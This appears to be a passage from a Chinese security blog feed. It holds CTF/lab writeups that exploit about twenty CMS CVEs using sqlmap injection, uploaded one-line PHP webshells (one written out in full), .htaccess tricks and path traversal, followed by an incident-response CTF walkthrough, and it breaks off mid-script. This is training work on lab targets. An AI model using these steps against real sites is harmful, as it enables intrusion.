        <content type="html"><![CDATA[<h2 id="cve-2022-32991">CVE-2022-32991</h2><p><strong>靶标介绍：</strong></p><p><strong>该CMS的welcome.php中存在SQL注入攻击。</strong></p><p>随便注册一个账号先登录一下，来到题目所说的welcome.php</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748952726777-f54bb286-6d0d-4191-98bf-0847007f61dc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>点start可以发现有很多的get参数</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748952789769-ac41e6fa-13aa-42e8-9825-336ffe94fbc4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿上cookie，用sqlmap能一把梭（）</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748953049406-f701febc-df8a-4a3e-ac2e-b5677917438a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1748953083899-7897961f-6bec-42d4-a872-5e5812dd45dc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1748953112712-f797971c-c554-4610-a2e6-2e25010de8dc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-30887">CVE-2022-30887</h2><p><strong>靶标介绍：</strong></p><p><strong>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的,该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。该CMS中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</strong></p><p>原来似乎可以通过访问网站开发者的个人网站找到其邮箱，现在好像删掉了。</p><p>密码则是弱口令，作者名字mayurik</p><p>成功登录后，由题目找到Medicine-ManageMedicine下存在文件上传漏洞，直接写一个一句话木马传上去</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748955902750-50034776-3571-4ac2-8b6b-021b15f8f066.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后用蚁剑连接即可</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748955956425-aa01a156-9f1b-4391-b412-40ce2f92ee68.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-28512">CVE-2022-28512</h2><p><strong>靶标介绍：</strong></p><p><strong>Fantastic Blog(CMS)是一个绝对出色的博客/文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。该CMS的/single.php路径下，id参数存在一个SQL注入漏洞。</strong></p><p>根据题目描述，直接找single.php注就行，sqlmap仍可以一把梭</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748957476519-63f88611-6a8b-4197-b309-a8a261b2e7fd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-28525">CVE-2022-28525</h2><p><strong>靶标介绍：</strong></p><p><strong>ED01-CMS v20180505 存在任意文件上传漏洞</strong></p><p>账号和密码都是admin登陆进入管理页面</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748959676759-86bf7913-dba9-4324-a5a1-0f63230865b6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>posts-view allposts中存在任意文件上传漏洞，上传一个一句话木马就行</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748959764484-f7f8af44-9311-48e2-9e16-ad5da63ad7dd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>蚁剑连接</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748959779495-2c546fef-c525-4fdc-b670-36ce01cca347.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-28060">CVE-2022-28060</h2><p><strong>靶标介绍：</strong></p><p><strong>Victor CMS v1.0 /includes/login.php 存在sql注入</strong></p><p>根据提示访问，有三个post传参的参数，其中user_name处存在时间盲注</p><p>仍然可以用sqlmap一把梭</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1748967522715-55d4475a-b636-4011-b0b1-5e39bf026242.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-25488">CVE-2022-25488</h2><p><strong>靶标介绍：</strong></p><p><strong>Atom CMSv2.0存在sql注入漏洞在/admin/ajax/avatar.php页面</strong></p><p>直接访问以后是个404，尝试访问/admin/ajax</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749028387839-7bd7bbd6-8f13-475a-a60f-12e903df69a0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在navigation.php中发现有个id参数</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749028419942-751e9591-8d96-469c-81ff-7271ee4bbd9c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>sqlmap一把梭</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749028347407-dbed9f10-f2b3-4220-9ec1-b193c76d1c35.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2023-1313">CVE-2023-1313</h2><p><strong>靶标介绍：</strong></p><p><strong>cockpit在2.4.1版本之前存在任意文件上传漏洞PS：通过在浏览器中打开/install来运行安装</strong></p><p>刚开始访问时，账密输入什么都显示不对，访问一下/install重新初始化一下，账密就都变成了admin</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749035715035-93cebdd6-ecf5-4054-ac94-ecc15c0c2b6d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>assets中上传一个一句话木马即可</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749035766139-5f8e443b-3dad-4c9b-8f36-52c9fb46993a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749035802951-bbc58b4f-148c-4eec-ab46-8cb8a9cf64b9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-23880">CVE-2022-23880</h2><p><strong>靶标介绍：</strong></p><p><strong>taoCMS v3.0.2文件管理处存在任意文件上传漏洞，攻击者可执行任意代码</strong></p><p>先点击右下角的管理</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749038007917-55380166-4830-499f-a73a-d52e378a9741.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>来到登陆页面后，查看页面源代码，可以看到默认账密</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749038062929-1cc0ee96-7b70-4e68-a37d-80a32129d51a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在文件管理处新建一个文件，写入一句话</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749038169533-d8d7e94a-0717-4d5e-a5d3-b0a935bb3bd0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-25578">CVE-2022-25578</h2><p><strong>靶标介绍：</strong></p><p><strong>taocmsv3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</strong></p><p>此题与上题一样，先登录进去</p><p>修改.htaccess，将png解析为php</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749039231887-5ba979a6-02ca-4b8b-a57a-8f5ed41ef432.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>讲一句话木马文件后缀改为png后上传</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749039304440-5bf18ce8-d239-41e7-8948-c185269644a2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749039356935-ea8304d7-2a95-463d-aa5f-72f0dcce143f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-26965">CVE-2022-26965</h2><p><strong>靶标介绍：</strong></p><p><strong>Pluck-CMS-Pluck-4.7.16 后台RCE</strong></p><p>弱口令admin登录</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749041431328-d1960706-e48c-4ab1-a871-884b56f97f48.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>options-choose theme-install theme</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749041532655-1c27aac0-7b04-4e22-a8a9-87bc8ab16d54.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749041567001-851becc8-f858-4979-8400-2ada787622c1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>随便找一个pluckcms的主题下载，我在<ahref="https://www.xobit.nl/themes/">这里</a>找的</p><p>修改其中的info.php，用来释放木马</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749041701583-2b520e24-784f-48cb-a379-47345b8eaa30.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打包成压缩包后上传</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749041781953-847dc565-1443-4bd2-b0f0-3ce4311c51df.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749041857159-72527d45-6002-4c9e-a3f8-ff1b44004b28.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2023-27179">CVE-2023-27179</h2><p><strong>靶标介绍：</strong></p><p>**GDidees CMSv3.9.1及更低版本被发现存在本地文件泄露漏洞，漏洞通过位于/_admin/imgdownload.php 的 filename 参数进行利用。**</p><p>描述中的参数处存在目录穿越</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749043000773-696b5511-ff97-4fb1-88c1-24e5205af901.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749043018211-86ca73e0-4e9f-44d2-b200-716d01d84b8e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-26201">CVE-2022-26201</h2><p><strong>靶标介绍：</strong></p><p><strong>Victor CMS v1.0 存在二次注入漏洞</strong></p><p>在/admin/categories.php下存在二次注入漏洞</p><p>找到添加分类的sql语句</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749046049035-e0cecd7f-fc5d-4339-876c-ee41190a6278.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>payload</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749045873718-907d8621-37d6-4427-a1e0-59a525d7e995.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-25401">CVE-2022-25401</h2><p><strong>靶标介绍：</strong></p><p><strong>Cuppa CMS v1.0administrator/templates/default/html/windows/right.php文件存在任意文件读取漏洞</strong></p><p>访问 /templates/default/html/windows/right.php ，是一片空白</p><p>查看<ahref="https://github.com/CuppaCMS/CuppaCMS/blob/master/templates/default/html/windows/right.php">cuppacms</a>对应的源码</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749118802752-5f0223b6-4b65-4592-9132-af26cf20cf61.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>通过post传参url可以做到目录穿越</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749118843746-4e99bf15-df6e-4a28-8be0-43aa2320b5eb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749118854953-72bcd511-d17f-4ab9-8c5b-61bfee140c14.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2023-2130">CVE-2023-2130</h2><p><strong>靶标介绍：</strong></p><p><strong>在SourceCodester采购订单管理系统1.0中发现了一项被分类为关键的漏洞。受影响的是组件GET参数处理器的文件/admin/suppliers/view_details.php中的一个未知函数。对参数id的操纵导致了SQL注入。可以远程发起攻击。</strong></p><p>根据描述找到漏洞点sqlmap一把梭</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749125781549-f6146880-7ec6-475e-93e2-62a3bdb9bde7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-23316">CVE-2022-23316</h2><p><strong>靶标介绍：</strong></p><p><strong>taoCMS v3.0.2 存在任意文件读取漏洞</strong></p><p>跟之前一样登录，这里文件管理中可以目录穿越</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749126001379-05a04b21-a5b7-487e-9ad7-f4356b83bcc0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-25099">CVE-2022-25099</h2><p><strong>靶标介绍：</strong></p><p><strong>WBCE CMS v1.5.2 /language/install.php文件存在漏洞，攻击者可精心构造文件上传造成RCE</strong></p><p>访问/admin，账号admin，弱口令123456登录成功</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749126729847-72810d73-e4fe-4d31-8a86-2f30258d396a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>add-ons - languages中存在文件上传漏洞</p><p>不清楚文件上传的路径，直接用<?php system('cat /flag');?></p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749126798550-c5b8dceb-48ca-4225-ab3a-617c6ef8fafd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749126861762-bddba8bf-4ed8-4575-943f-1e9a27d1001e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-24223">CVE-2022-24223</h2><p><strong>靶标介绍：</strong></p><p><strong>AtomCMS SQL注入漏洞</strong></p><p>访问/admin，跳转到了一个登录页面</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749130862968-f4fcf565-4759-4cb0-9550-452e8d2067b2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>email参数处存在sql注入，sqlmap一把梭</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749130901153-ea3912d7-98f1-40fb-bba1-be8655248e62.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-23906">CVE-2022-23906</h2><p><strong>靶标介绍：</strong></p><p><strong>CMS Made Simple v2.2.15被发现包含通过上传图片功能的远程命令执行 (RCE)漏洞。此漏洞通过精心制作的图像文件被利用。</strong></p><p>访问/admin，来到后台登录页面，admin/123456弱口令登录</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749131631954-5e953e5d-4925-4d68-ad24-e5890658c543.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>内容-file manager中存在文件上传，将php后缀名改为png后上传</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749131730172-c7c4851b-147e-4b5b-8fb9-33a40d6aeb24.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>选中上传的1.png，点击copy，把名字改为1.php</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749131777702-dc0e5f7b-475e-4a2a-969a-fd77dadcfb37.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-漏洞靶标/1749131792289-9fea9a9a-4210-4b54-93d8-5bd91813996c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2022-24263">CVE-2022-24263</h2><p><strong>靶标介绍：</strong></p><p><strong>Hospital Management System sqli</strong></p><p>点击Already have an account?来到登陆页面，这里存在sql注入</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749195071764-0dac00d1-392b-4f7d-a437-7b795c2beced.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>确定参数名称后sqlmap一把梭</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749195092137-279c84ab-29fb-4416-937e-e1b61180759d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2023-23752">CVE-2023-23752</h2><p><strong>靶标介绍：</strong></p><p><strong>Joomla是一个开源免费的内容管理系统（CMS），基于PHP开发。在其4.0.0版本到4.2.7版本中，存在一处属性覆盖漏洞，导致攻击者可以通过恶意请求绕过权限检查，访问任意RestAPI。</strong></p><p>存在未授权访问api</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749197181428-02380675-aa3f-4197-9430-ed1b9d51e775.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="cve-2010-1870">CVE-2010-1870</h2><p><strong>靶标介绍：</strong></p><p><strong>struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(u0023)或8进制(43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开</strong></p><p>很老的洞，有工具能一把梭</p><figure><imgsrc="/images/春秋云境-漏洞靶标/1749199129629-1c3cec8f-bcc2-4d8b-a6ed-99399a299680.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于如何科学上网</title>
      <link href="/posts/3dfad485/"/>
      <url>/posts/3dfad485/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4b0f0fac0259df0d8055fbc08bca6262354e1da1dd018c7cafeaa7278a6cb562"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Parloo杯2025初赛 writeup+复现</title>
      <link href="/posts/f6af6eda/"/>
      <url>/posts/f6af6eda/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这波Aura✌tql，仅凭一己之力干完了应急响应，本菜鸡直接被带飞OrzOrz</p><p>比赛的时候根本跟不上aura✌的进度，虽说看了题但是没做几道，现在好好复现一下。</p><p>除了应急响应以外的题就不复现了，都是musc。。。</p></blockquote><h1 id="主线">主线</h1><p><ahref="https://www.blog.st4rr.top/writeups/第二届%22Parloo%22CTF应急响应挑战赛应急响应场景挑战说明手册.pdf">第二届“Parloo”CTF应急响应挑战赛应急响应场景挑战说明手册.pdf</a></p><h2 id="section">1</h2><p><strong>提交堡垒机中留下的flag 附件下载地址：百度网盘https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666 提取码: 6666夸克网盘 https://pan.quark.cn/s/46653bd06cca 123云盘https://www.123865.com/s/qDVvjv-zVBod 提取码:6666</strong>**解压密码：应急响应环境解压密码网络拓扑环境 Skills@@<spanclass="citation" data-cites="Skills">@Skills</span>@@<spanclass="citation" data-cites="Skills">@Skills</span> 畸行的爱Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt**</p><p>登录面板即可看到flag</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747819042954-ffc480dd-977b-4d4d-a3a7-93a24d2d9dab.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{2025_qiandao_flag}</p><h2 id="section-1">2</h2><p><strong>提交WAF中隐藏的flag</strong></p><p>进入雷池面板即可找到</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747819226193-e671f80c-050b-4e1d-b0be-d46d44d0216f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{2025_waf}</p><h2 id="section-2">3</h2><p><strong>提交Mysql中留下的flag</strong></p><p>先在面板中搜索一下flag</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747819606208-bee2a8bb-4daf-4f68-8d55-3527abbbf7bd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747819770683-2a9b8cb7-8903-4311-8379-f294c455ca64.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{Mysql_<span class="citation" data-cites="2025">@2025</span>}</p><h2 id="section-3">4</h2><p><strong>提交攻击者的攻击IP</strong></p><p>看waf的拦截记录</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747820002829-57e4d755-f119-4146-b9ac-254c80c5a88f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{192.168.20.107}</p><h2 id="section-4">5</h2><p><strong>提交攻攻击者最早攻击时间flag格式为palu{xxxx-xx-xx-xx-xx-xx}</strong></p><p>这题题目要求的格式有问题。。。</p><p>由上题可知</p><p>palu{2025-05-05-00:04:40}</p><h2 id="section-5">6</h2><p><strong>提交web服务泄露的关键文件名</strong></p><p>waf中查看路由配置，可以看到泄露了一个key.txt</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747821075622-90ea8c48-1aac-47e2-b762-4193c1875734.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{key.txt}</p><h2 id="section-6">7</h2><p><strong>提交泄露的邮箱地址</strong></p><p>访问一下这个泄露的路由可以看到里面有提到邮箱</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747821234372-b1407bc8-a4f0-4879-9a13-2d349f61d8fa.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{parloo@parloo.com}</p><h2 id="section-7">8</h2><p><strong>提交立足点服务器ip地址</strong></p><p>192.168.20.108是sshserver的ip，但是却存在攻击行为，因此可以判断是立足点服务器</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747821429152-ab5b4fb6-5681-47d0-bf50-b4d5156a9136.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{192.168.20.108}</p><h2 id="section-8">9</h2><p><strong>提交攻击者使用的提权的用户和密码</strong></p><p><strong>提交格式</strong></p><p><strong>palu{账号/密码}</strong></p><p>在sshserver中找到恶意用户的账密密文</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747821984530-7bdc793a-966c-4ae1-99ba-363dddd110d6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用jtr爆破一下</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747822155351-ecfc6e3d-6b2d-4671-b39b-9f4ad79bafed.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{parloo/parloo}</p><h2 id="section-9">10</h2><p><strong>提交攻击者留下的的文件内容作为flag提交</strong></p><p>在sshserver的/home/parloo下</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747825487411-d8010ef2-1ce2-45cd-ace3-57266259352f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{hi_2025_parloo_is_hack}</p><h2 id="section-10">11</h2><p><strong>提交权限维持方法服务的名称</strong></p><p>列出sshserver上正在运行的服务</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747826069831-1c8e91d3-75a2-41c0-89df-14416e5f5657.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{rootset}</p><h2 id="section-11">12</h2><p><strong>提交攻击者攻击恶意服务器连接地址作为flag提交</strong></p><p>在server中可以找到一个叫aa的程序，提取出来</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747826638130-eb8cef89-3296-4af9-9423-09af96bea967.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>丢进IDA就能看见</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747826863101-aabfaf56-41a3-4b61-97d3-bba8cbd4f934.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{47.101.213.153}</p><h2 id="section-12">13</h2><p><strong>找到系统中被劫持的程序程序名作为flag提交</strong></p><p>在sshserver中对/usr/bin下的程序按照修改时间排序</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747897866224-9f221562-5cc7-4a47-b2ee-0ec0bed1dd91.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{id}</p><h2 id="section-13">14</h2><p><strong>找到系统中存在信息泄露的服务运行端口作为flag提交</strong></p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747894563043-a84b7cd6-b9b3-4269-bcfc-2ba2307248ce.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{8081}</p><h2 id="section-14">15</h2><p><strong>提交Parloo公司项目经理的身份证号作为flag提交</strong></p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747894636012-cc5958e4-fb6e-4103-aa5b-7de66f4ff9aa.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{310105198512123456}</p><h2 id="section-15">16</h2><p><strong>提交存在危险功能的操作系统路径作为flag提交。flag格式为palu{/xxx/xxx}</strong></p><p>可以看到存在危险路由</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747895540946-803a40ae-3b52-4a57-b043-a2300450575d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{admin/parloo}</p><h2 id="section-16">17</h2><p><strong>提交进源机器中恶意程序的MD5作为flag进行提交。flag格式为palu{MD5小写}</strong></p><p>可以发现palu03机器的temp文件夹中存在一个奇怪的文件，同时也可以注意到机器开机时就报的一个错svhost.exe已停止运行</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747896309072-7e8116ea-5a07-4000-8f76-0083080805cb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747896499300-a1286f9e-add2-48ae-bbc8-9c54a593833c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{0f80a92621b8c4c3303d198d13776b34}</p><h2 id="section-17">18</h2><p><strong>提交攻击者留下的恶意账户名称md5后作为flag进行提交。格式为palu{md5{xxxxx}}</strong></p><p>登录时发现有个hack用户</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747896650010-594b23dc-dade-4af8-873a-256b7b63bffb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747896698180-133d9e8a-0639-4044-9f2b-8384899dd8f1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{d78b6f30225cdc811adfe8d4e7c9fd34}</p><h2 id="section-18">19</h2><p><strong>提交内部群中留下的flag并提交</strong></p><p>查看聊天记录就能看到</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747896804193-ddeb1d4a-0b8f-4e10-85eb-fcf60bbb490e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{nbq_nbq_parloo}</p><h2 id="section-19">20</h2><p><strong>请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</strong></p><p>server中cat /var/log/parloo/command.log查看日志即可看到</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747897076583-4a2cac25-5ea1-4034-bcc3-82c571e5712d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{Server_Parloo_2025}</p><h2 id="section-20">21</h2><p><strong>提交获取敏感内容IP的第一次执行命令时间作为flag进行提交。flag格式为palu{xxxx-xx-xx:xx:xx:xx}</strong></p><p>根据上题日志</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747897311887-468a983b-ab06-4285-bd14-fbafaa5d895f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{2025-05-04:15:30:38}</p><h2 id="section-21">22</h2><p><strong>提交攻击者使用的恶意ip和端口flag格式为palu{xx.xx.xx.xx:xxxx}</strong></p><p>根据上题日志，可以看到一个反弹shell的命令</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747897446411-d95866bc-8162-4d37-b3ee-a261b1351658.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{10.12.12.13:9999}</p><h2 id="section-22">23*</h2><p><strong>提交重要数据的明文内容作为flag提交</strong></p><p>gitea中还有个hack用户，仓库中有个加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">        shifted = <span class="built_in">ord</span>(char) + (i % <span class="number">5</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((xored &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">        encrypted.append(<span class="string">f&quot;<span class="subst">&#123;substituted:02x&#125;</span>&quot;</span>)</span><br><span class="line">    <span 